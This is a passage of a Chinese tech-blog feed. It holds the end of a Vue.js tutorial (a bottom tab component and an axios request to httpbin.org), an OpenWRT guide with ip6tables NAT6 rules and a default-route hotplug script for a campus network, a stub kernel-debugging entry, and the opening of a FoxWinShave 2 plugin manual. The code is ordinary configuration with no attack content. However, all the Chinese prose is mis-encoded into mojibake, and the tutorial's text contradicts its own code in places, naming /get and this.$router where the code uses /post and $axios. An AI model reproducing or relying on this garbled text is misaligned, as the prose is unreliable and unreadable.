<p><code>Tab</code> å±äºä¸é¡µé¢é€»è¾‘æ— å…³ï¼Œä½†åˆå¤„å¤„è¦ä½¿ç”¨çš„å…ƒç´ ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†å…¶ç‹¬ç«‹æˆä¸ºä¸€ä¸ªç»„ä»¶</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/components/Tab.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;tab&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;item&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;router(&#39;/&#39;)&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>home<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;item&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;router(&#39;/about&#39;)&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>about<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;item&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;router(&#39;/foo&#39;)&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>foo<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Tab&#39;</span><span class="p">,</span>
  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">router</span> <span class="p">(</span><span class="nx">url</span><span class="p">){</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">$router</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
<span class="p">#</span><span class="nn">tab</span> <span class="p">{</span>
  <span class="k">display</span><span class="p">:</span> <span class="kc">flex</span><span class="p">;</span>
  <span class="k">justify-content</span><span class="p">:</span> <span class="kc">space</span><span class="o">-</span><span class="n">around</span><span class="p">;</span>
  <span class="k">align-items</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">bottom</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">position</span><span class="p">:</span> <span class="kc">fixed</span><span class="p">;</span>
  <span class="k">height</span><span class="p">:</span> <span class="mi">65</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">left</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">width</span><span class="p">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
  <span class="k">background-color</span><span class="p">:</span> <span class="kc">aquamarine</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">.</span><span class="nc">item</span> <span class="p">{</span>
  <span class="k">padding-top</span><span class="p">:</span> <span class="mi">5</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">display</span><span class="p">:</span> <span class="kc">flex</span><span class="p">;</span>
  <span class="k">flex-direction</span><span class="p">:</span> <span class="kc">column</span><span class="p">;</span>
  <span class="k">justify-content</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">align-items</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">height</span><span class="p">:</span> <span class="mi">50</span><span class="kt">px</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p>åœ¨è¿™é‡Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªåº•éƒ¨å¯¼èˆªæ ï¼Œæœ‰ä¸‰ä¸ª <code>Tab</code> ï¼Œå¹¶ä¸”å¯¹åº”è·³è½¬åˆ°ä¸åŒçš„é¡µé¢</p>
<h2 id="2-åˆ›å»º-foovue-ç›¸å…³é€»è¾‘å¹¶ä¸åç«¯äº¤äº’">2. åˆ›å»º <code>Foo.vue</code> ç›¸å…³é€»è¾‘å¹¶ä¸åç«¯äº¤äº’</h2>
<p>å› ä¸ºæˆ‘ä»¬éœ€è¦ä»è¿œç«¯APIè·å–æ•°æ®å¹¶è¿›è¡Œå±•ç¤ºï¼Œå°±æ¶‰åŠç½‘ç»œè¯·æ±‚ã€‚åœ¨vueä¸­ï¼Œå®˜æ–¹æ¨èä½¿ç”¨ <a href="https://github.com/axios/axios">axios</a> å‘èµ·è¯·æ±‚ã€‚<code>axios</code> æ˜¯ä¸€ä¸ªåŸºäº <code>promise</code> çš„å¼‚æ­¥ç½‘ç»œè¯·æ±‚åº“ï¼Œç›¸å…³ç”¨æ³•å¯å‚è€ƒæ–‡æ¡£æˆ–ç½‘ä¸Šæ•™ç¨‹</p>
<p>å®‰è£… <code>axios</code></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">yarn add axios
</code></pre></div><p>æ¥ç€åœ¨ <code>src/main.js</code> ä¸­åŠ å…¥ä»¥ä¸‹è¯­å¥å¯ç”¨ <code>axios</code></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kr">import</span> <span class="nx">Axios</span> <span class="nx">from</span> <span class="s1">&#39;axios&#39;</span>
<span class="c1">// æŠŠaxiosæ·»åŠ åˆ°åŸå‹é“¾
</span><span class="c1"></span><span class="nx">Vue</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">$axios</span> <span class="o">=</span> <span class="nx">Axios</span>
</code></pre></div><p>ç°åœ¨å°±å¯ä»¥åœ¨vueå®ä¾‹ä¸­ç”¨ <code>this.$router</code> æ¥è®¿é—®è·¯ç”±äº†</p>
<hr>
<p>æ¥ç€æ¥åˆ›å»º <code>Foo.vue</code></p>
<div class="highlight"><pre class="chroma"><code class="language-vue" data-lang="vue"><span class="nx">src</span><span class="o">/</span><span class="nx">views</span><span class="o">/</span><span class="nx">Foo</span><span class="p">.</span><span class="nx">vue</span>

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;foo&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;{{</span> <span class="nx">result</span> <span class="p">}}&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">button</span> <span class="nt">@click</span><span class="s">=&#34;bar()&#34;</span><span class="p">&gt;</span><span class="na">bar</span><span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Foo&#39;</span><span class="p">,</span>
  <span class="nx">data</span><span class="p">(){</span>
    <span class="k">return</span> <span class="p">{</span>
      <span class="nx">result</span> <span class="o">:</span> <span class="s1">&#39;naive&#39;</span>
    <span class="p">}</span>
  <span class="p">},</span>
  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">bar</span><span class="p">(){</span>
      <span class="cm">/* eslint-disable */</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">result</span> <span class="o">=</span> <span class="s1">&#39;loading...&#39;</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">$axios</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;http://httpbin.org/post&#39;</span><span class="p">)</span>
        <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">res</span> <span class="p">=&gt;</span> <span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">result</span> <span class="o">=</span> <span class="nx">res</span><span class="p">})</span>
        <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">res</span> <span class="p">=&gt;</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">res</span><span class="p">)})</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p><del>å…·ä½“å®ç°ä»£ç é‡Œé¢å¾ˆæ¸…æ¥šäº†</del> è¿™ä¸ªæ–‡ä»¶çš„ä½œç”¨å°±æ˜¯è¯·æ±‚ <code>http://httpbin.org/get</code> å¹¶æŠŠç»“æœæ˜¾ç¤ºåœ¨ç•Œé¢ä¸Š</p>
<p><strong>æ³¨æ„å‰åç«¯åˆ†ç¦»çš„é¡¹ç›®ä¼šæœ‰<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">è·¨åŸŸ(CORS)é—®é¢˜</a>ï¼Œè¿™ä¸ªé—®é¢˜æ¯”è¾ƒå¤æ‚ï¼Œå·¨å‘ï¼Œç½‘ä¸Šä¹Ÿæœ‰è¾ƒå¤šè§£å†³çš„æ–‡ç« <del>å’•å’•å’•</del></strong></p>
<h1 id="0x5-æŠ€å·§åŠå‘ä»¬">0x5 æŠ€å·§åŠå‘ä»¬</h1>
<p>è¿™é‡Œä»‹ç»ä¸€äº›æˆ‘å†™vueé¡¹ç›®é‡åˆ°çš„å‘å’Œä½¿ç”¨çš„æŠ€å·§</p>
<h2 id="data-methods-computed-props-çš„åŒºåˆ«">data methods computed props çš„åŒºåˆ«</h2>
<p><del>TODO</del></p>
<p>vueä¸­å­˜å‚¨æ•°æ®æœ‰å‡ ç§æ–¹å¼â€”â€”dataã€</p>
<h1 id="0x6-ç»“è¯­">0x6 ç»“è¯­</h1>
<p>åˆ°æ­¤ï¼Œä¸€ä¸ªç®€å•çš„vueé¡¹ç›®å°±å®Œæˆäº†ï¼Œå¯¹äºå¦‚ä½•ç»„ç»‡é¡¹ç›®ï¼Œå‰åç«¯å¦‚ä½•äº¤äº’åº”è¯¥å·²ç»æœ‰äº†åˆæ­¥äº†è§£ã€‚æœ¬æ–‡ä¹Ÿä¼šæŒç»­æ›´æ–°ï¼Œæ¬¢è¿å…³æ³¨æˆ‘çš„<a href="https://blog.creedowl.com/">blog</a></p>
<p>æœ¬æ–‡çš„å®ä¾‹è¯·è®¿é—®<a href="https://github.com/creedowl/vue_demo/">github</a></p>]]></content>
        <author>
            <name><![CDATA[Creedowlâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/ipv6_and_nat6_in_nuaa/</id>
        <title><![CDATA[å—èˆªæ ¡å›­ç½‘OpenWRTé…ç½®IPv6 NAT6]]></title>
        <updated>2019-04-04T15:29:39+08:00</updated>
        <link href="https://blog.creedowl.com/posts/ipv6_and_nat6_in_nuaa/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/ipv6_and_nat6_in_nuaa/"><![CDATA[<blockquote>
<p>å½“å‰IPv6è¶Šæ¥è¶Šæµè¡Œï¼Œä¸ä½†è§£å†³äº†IPv4åœ°å€ä¸å¤Ÿç”¨çš„é—®é¢˜ï¼Œè¿˜èƒ½ç»™æ¥å…¥çš„è®¾å¤‡æä¾›å…¬ç½‘è®¿é—®çš„æ”¯æŒã€‚ä½†ç”±äºæ ¡å›­ç½‘çš„ç‰¹æ®Šæ€§ï¼Œè™½ç„¶å¾ˆæ—©å°±æœ‰äº†IPv6æ”¯æŒï¼Œå¤§éƒ¨åˆ†å­¦æ ¡åœ¨IPv6åœ°å€åˆ†é…ä¸Šå´æœ‰å‰§æ¯’ï¼Œæ— æ³•å‘ä¸‹æ¸¸è®¾å¤‡åˆ†é…ç‹¬ç«‹çš„IPv6åœ°å€ï¼ˆæ­£å¸¸å®¶åº­ç½‘ç»œç¯å¢ƒä¸­è·¯ç”±å™¨åŠä¸‹æ¸¸è®¾å¤‡éƒ½èƒ½è‡ªåŠ¨åˆ†é…ç‹¬ç«‹çš„å…¬ç½‘IPv6åœ°å€ï¼‰ï¼Œä»¥å—èˆªä¸ºä¾‹ï¼ŒOpenWRTä¸Šè™½ç„¶è·å–åˆ°äº†2001å¼€å¤´ï¼Œ/64ç»“å°¾çš„å…¬ç½‘IPv6åœ°å€ï¼Œä½†ä¸‹æ¸¸è®¾å¤‡å´æ— IPv6è®¿é—®æƒé™ã€‚æœ¬æ–‡ä»‹ç»å—èˆªæ ¡å›­ç½‘ç¯å¢ƒä¸‹å¦‚ä½•åœ¨OpenWRTä¸‹è·å–IPv6å¹¶é…ç½®NAT6ä½¿ä¸‹æ¸¸è®¾å¤‡æ‹¥æœ‰IPv6è®¿é—®æƒé™ã€‚</p>
</blockquote>
<h2 id="0è½¯ç¡¬ä»¶éœ€æ±‚">0ï¼šè½¯ç¡¬ä»¶éœ€æ±‚</h2>
<p><strong>ç¡¬ä»¶</strong>ï¼šæ”¯æŒOpenWRTå›ºä»¶çš„è·¯ç”±å™¨æˆ–è½¯è·¯ç”±ï¼ˆæ¨èä½¿ç”¨è½¯è·¯ç”±ï¼Œæ€§èƒ½æ›´å¥½ï¼Œæ”¯æŒå¯ç”¨æ›´å¤šæœåŠ¡ï¼Œä¸”ä¸éœ€è¦è€ƒè™‘å¤ªå¤šå…¼å®¹æ€§é—®é¢˜ï¼Œx86ç‰ˆæœ¬OpenWRTä¸€æŠŠæ¢­ï¼‰</p>
<p><strong>è½¯ä»¶</strong>ï¼šè¾ƒæ–°ç‰ˆæœ¬çš„OpenWRTæˆ–å…¶è¡ç”Ÿç‰ˆæœ¬ï¼ˆledeï¼Œpandoraboxç­‰ï¼Œä½†åŸç‰ˆOpenWRTæœ€ä½³ï¼‰</p>
<p><strong>OpenWRTå†…æ ¸éœ€é«˜äº3.7</strong>ï¼Œ linux kernelåœ¨3.7ç‰ˆæœ¬å¼€å§‹æ”¯æŒNAT6</p>
<p><del>å†…æ ¸ç‰ˆæœ¬ä¸å¤Ÿé«˜ä¸”æ— æ³•å‡çº§å¯ä»¥å°è¯•æ—©å¹´ç”±åŒ—é‚®å¤§ä½¬å¼€å‘çš„NAT66é¡¹ç›®ï¼Œä½†ä¸æ¨è</del></p>
<p>æ‰€éœ€è½¯ä»¶åŒ…ï¼š</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ip6tables kmod-ipt-nat6 kmod-ip6tables kmod-ip6tables-extra luci-proto-ipv6 iputils-traceroute6
</code></pre></div><p>è¾ƒæ–°ç‰ˆæœ¬å·²ç»è‡ªå¸¦IPv6æ”¯æŒï¼Œè€ç‰ˆæœ¬éœ€è¦è‡ªå·±å®‰è£…ç›¸å…³è½¯ä»¶åŒ…ï¼Œä½†å…¼å®¹æ€§è¾ƒå·®ï¼Œæˆ–è€…å†…æ ¸ç‰ˆæœ¬ä¸è¶³ï¼Œå»ºè®®æ‰¾è¾ƒæ–°ç‰ˆæœ¬æˆ–è€…è‡ªè¡Œç¼–è¯‘ã€‚</p>
<h2 id="1openwrté…ç½®è·å–ipv6">1ï¼šOpenWRTé…ç½®è·å–IPv6</h2>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304901671.png/compress" alt="IPv6_setting_1"></p>
<h3 id="1-ä¿®æ”¹ipv6-ulaå‰ç¼€ä¸ºfdå¼€å¤´é»˜è®¤ä¸ºddå¼€å¤´">1. ä¿®æ”¹IPv6 ULAå‰ç¼€ä¸ºfdå¼€å¤´ï¼ˆé»˜è®¤ä¸ºddå¼€å¤´ï¼‰</h3>
<h3 id="2-ä¿®æ”¹wan6å£é…ç½®å¦‚ä¸‹å›¾æ‰€ç¤º">2. ä¿®æ”¹wan6å£é…ç½®ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰</h3>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304939503.png/compress" alt="IPv6_setting_2"></p>
<h3 id="3-ä¿®æ”¹lanå£dhcpæœåŠ¡å™¨é…ç½®å¦‚ä¸‹å›¾æ‰€ç¤º">3. ä¿®æ”¹lanå£DHCPæœåŠ¡å™¨é…ç½®ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰</h3>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304973656.png/compress" alt="IPv6_setting_3"></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304997028.png/compress" alt="IPv6_setting_4"></p>
<p>æ­¤æ—¶ç¨ç­‰ç‰‡åˆ»ï¼Œåœ¨æ¦‚å†µä¸­åº”è¯¥å°±èƒ½çœ‹åˆ°è·å–åˆ°çš„IPv6åœ°å€åŠä¸‹æ¸¸è®¾å¤‡DHCPv6åˆ†é…å†…ç½‘IPv6åœ°å€</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305013341.png/compress" alt="IPv6_setting_5"></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305030637.png/compress" alt="IPv6_setting_6"></p>
<p>ç°åœ¨ä½ çš„è·¯ç”±å™¨å·²ç»å¯ä»¥ä½¿ç”¨IPv6äº†ï¼Œä½†ä¸‹æ¸¸è®¾å¤‡å¹¶ä¸è¡Œï¼Œå°±éœ€è¦é…ç½®NAT6ã€‚</p>
<h2 id="2é…ç½®nat6">2ï¼šé…ç½®NAT6</h2>
<p>è™½ç„¶NAT6å¹¶ä¸ç¬¦åˆIPv6çš„è®¾è®¡å“²å­¦ï¼Œä½†å´èƒ½è§£å†³ä¸€äº›é—®é¢˜ï¼Œå¦‚å®‰å…¨éš”ç¦»ï¼Œæˆ–è€…åƒæˆ‘ä»¬è¿™æ ·é€šè¿‡å•ä¸€åœ°å€è½¬å‘ç»™å¤šä¸ªè®¾å¤‡ä½¿ç”¨ã€‚</p>
<h3 id="1-ä¿®æ”¹é˜²ç«å¢™">1. ä¿®æ”¹é˜²ç«å¢™</h3>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305046715.png/compress" alt="IPv6_setting_7"></p>
<p>åŠ å…¥ä»¥ä¸‹è‡ªå®šä¹‰è§„åˆ™</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nv">WAN6</span><span class="o">=</span>pppoe-wan
<span class="nv">LAN</span><span class="o">=</span>br-lan
ip6tables -t nat -A POSTROUTING -o <span class="nv">$WAN6</span> -j MASQUERADE
ip6tables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
ip6tables -A FORWARD -i <span class="nv">$LAN</span> -j ACCEPT
</code></pre></div><p><strong>æ³¨æ„è¿™é‡ŒWAN6å’ŒLANè¦æ”¹ä¸ºå¤–ç½‘IPv6å’Œå†…ç½‘ç½‘å¡åå­—ï¼Œåœ¨ç»ˆç«¯ä½¿ç”¨ifconfigæŸ¥çœ‹</strong></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305068355.png/compress" alt="IPv6_setting_8"></p>
<h3 id="2-é…ç½®ç½‘å…³">2. é…ç½®ç½‘å…³</h3>
<p>åœ¨ç»ˆç«¯æ‰§è¡Œ <code>ip -6 r</code> æŸ¥çœ‹é»˜è®¤ç½‘å…³ï¼ˆdefaultå¼€å¤´ï¼‰ï¼Œå¦‚æœæ˜¯ç±»ä¼¼</p>
<p><code>default from 2001:xxxx:xxxx:xxxx::/64 via fe80::ded2:fcff:fe98:64f7 dev pppoe-wan proto static metric 512 pref medium</code></p>
<p>è¿™æ ·è›‹ç–¼çš„ç½‘å…³ï¼Œéœ€è¦å»æ‰<code>from 2001:xxxx:xxxx:xxxx::/64</code> è¿™æ®µå†æ·»åŠ é»˜è®¤ç½‘å…³ï¼Œä¾‹å¦‚</p>
<p><code>ip -6 route add default via fe80::ded2:fcff:fe98:64f7 dev pppoe-wan proto static metric 512</code></p>
<p>å¯ä»¥å»ºç«‹ä¸€ä¸ª<code>/etc/hotplug.d/iface/99-ipv6</code>å®ç°è‡ªåŠ¨é…ç½®</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="cp">#!/bin/sh
</span><span class="cp"></span><span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$ACTION</span><span class="s2">&#34;</span> <span class="o">=</span> ifup <span class="o">]</span> <span class="o">||</span> <span class="nb">exit</span> <span class="m">0</span>
<span class="nv">iface</span><span class="o">=</span>wan6
<span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$iface</span><span class="s2">&#34;</span> -o <span class="s2">&#34;</span><span class="nv">$INTERFACE</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="nv">$iface</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">||</span> <span class="nb">exit</span> <span class="m">0</span>
ip -6 route add <span class="sb">`</span>ip -6 route show default<span class="p">|</span>sed -e <span class="s1">&#39;s/from [^ ]* //&#39;</span><span class="sb">`</span>
logger -t IPv6 <span class="s2">&#34;Add IPv6 default route.&#34;</span>
</code></pre></div><p>æœ€ååˆ«å¿˜äº†ä¿®æ”¹æƒé™</p>
<p><code>chmod +x /etc/hotplug.d/iface/99-ipv6</code></p>
<p>é‡å¯è·¯ç”±å™¨å°±å¯ä»¥æ„‰å¿«çš„ç©è€äº†ã€‚</p>
<p><del>æœ¬æ¥è¿˜æƒ³æŠ˜è…¾IPv6ç«¯å£è½¬å‘ï¼Œä½†ä¸€ç›´æ— æ³•é…ç½®æˆåŠŸã€‚åæ¥çªç„¶å‘ç°å—èˆªæ ¡å›­ç½‘ä¸‹æ²¡æœ‰å¯¹IPv4åšä¸¥æ ¼éš”ç¦»ï¼ˆé™¤äº†80ç«¯å£åŸºæœ¬ä¸Šéƒ½èƒ½ç›´æ¥è®¿é—®ï¼‰ï¼Œå°±ç›´æ¥åšIPv4ç«¯å£è½¬å‘é…åˆDDNSï¼Œè¿æ¥æ ¡å›­WIFIï¼ˆnuaa.portalï¼Œ<strong>ä»˜è´¹ç‰ˆæœ¬</strong>ï¼‰å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œé€Ÿåº¦è¿˜æŒºå¿«ã€‚ã€‚ã€‚å°±çœŸé¦™äº†ã€‚ã€‚ä¸è¿‡é…ç½®IPv6ç«¯å£è½¬å‘è¿˜æ˜¯æœ‰æ„ä¹‰ï¼Œæ¯”å¦‚å¯ä»¥ä»éæ ¡å›­ç½‘è®¿é—®ï¼Œæ ¡å›­ç½‘è®¿é—®IPv6æ— éœ€è®¤è¯ï¼ˆä¸è¦å……é’±äº†ï¼‰ï¼Œç›¸å…³æ•™ç¨‹æœ‰ç©ºå†è¡¥ä¸Šï¼ˆå’•å’•å’•ï¼‰æœ‰éœ€æ±‚å¯ä»¥å‚è€ƒ<a href="https://shura.eu.org/2018/12/06/ipv6-NAT%E5%90%8E%E9%85%8D%E7%BD%AE%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">ipv6 NATåé…ç½®ç«¯å£è½¬å‘</a></del></p>
<h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2>
<blockquote>
<p><a href="https://github.com/tuna/ipv6.tsinghua.edu.cn/blob/master/openwrt.md">æ¸…åOpenWRT è·¯ç”±å™¨ä½œä¸º IPv6 ç½‘å…³çš„é…ç½®</a></p>
</blockquote>]]></content>
        <author>
            <name><![CDATA[Creedowlâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/linux%E5%86%85%E6%A0%B8gdb+qemu%E8%B0%83%E8%AF%95/</id>
        <title><![CDATA[Linuxå†…æ ¸gdb+qemuè°ƒè¯•]]></title>
        <updated>2019-01-28T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/linux%E5%86%85%E6%A0%B8gdb+qemu%E8%B0%83%E8%AF%95/"/>
        <content type="text/html" src="https://doublemice.github.io/linux%E5%86%85%E6%A0%B8gdb+qemu%E8%B0%83%E8%AF%95/"><![CDATA[Linuxå†…æ ¸gdb+qemuè°ƒè¯•]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/foxwinshave2.html</id>
        <title><![CDATA[FoxWinShave 2 ä¸­æ–‡ä½¿ç”¨æ‰‹å†Œ]]></title>
        <updated>2019-01-12T08:45:27+08:00</updated>
        <link href="https://www.noisyfox.io/foxwinshave2.html"/>
        <content type="text/html" src="https://www.noisyfox.io/foxwinshave2.html"><![CDATA[<p>FoxWinShave 2 ç°å·²ä¸Šæ¶ GameMaker: Marketplaceï¼Œæ”¯æŒ GM8, GMS 1.4 å’Œ GMS 2ã€‚<a href="https://marketplace.yoyogames.com/assets/7696/foxwinshave" target="_blank" rel="noreferrer noopener" aria-label="ï¼ˆåœ¨æ–°çª—å£æ‰“å¼€ï¼‰">ç‚¹æ­¤ä»Marketplaceä¸‹è½½æœ€æ–°ç‰ˆæœ¬</a>ã€‚</p>



<hr class="wp-block-separator"/>



<h2>0. å‰ç½®æ¡ä»¶</h2>



<ul><li>ä»…æ”¯æŒ Windows å¹³å°ã€‚</li><li>æ”¯æŒ Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10ã€‚</li><li>æ”¯æŒ GameMaker 7, GameMaker 8, GameMaker 8.1, GameMaker Studio 1.4.x, GameMaker Studio 2 Desktopã€‚</li></ul>



<hr class="wp-block-separator"/>



<h2>1. å®‰è£…æ’ä»¶</h2>



<h3>1.0 GM 7, 8, 8.1</h3>



<p>èœå•æ  File-&gt; Import Resources&#8230; é€‰æ‹© FoxWinShave-GM8.gmres å¯¼å…¥æ’ä»¶åŠ Demoã€‚</p>



<ul><li>åœ¨å¼¹å‡ºçš„ Importing Resources å¯¹è¯æ¡†ä¸­ï¼Œè¯·åŠ¡å¿…å‹¾é€‰ Scripts å’Œ Include Files ä»¥å¯¼å…¥æ’ä»¶è¿è¡Œæ‰€å¿…é¡»çš„æ–‡ä»¶å’Œè„šæœ¬ã€‚</li><li>å¦‚éœ€åŒæ—¶å¯¼å…¥ Demo ä»£ç åŠç´ æï¼Œè¯·å°† Spritesï¼ŒObjects å’Œ Rooms ä¸€å¹¶å‹¾é€‰ä¸Šã€‚</li></ul>



<h3>1.1 GMS 1.4.x åŠ GMS 2 Desktop</h3>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="300" height="189" src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-300x189.png" alt="" class="wp-image-569" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/image-300x189.png 300w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-768x483.png 768w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-1024x644.png 1024w, https://www.noisyfox.io/wp-content/uploads/2019/01/image.png 1588w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption>Import resources: FoxWinShave å¯¹è¯æ¡†</figcaption></figure></div>



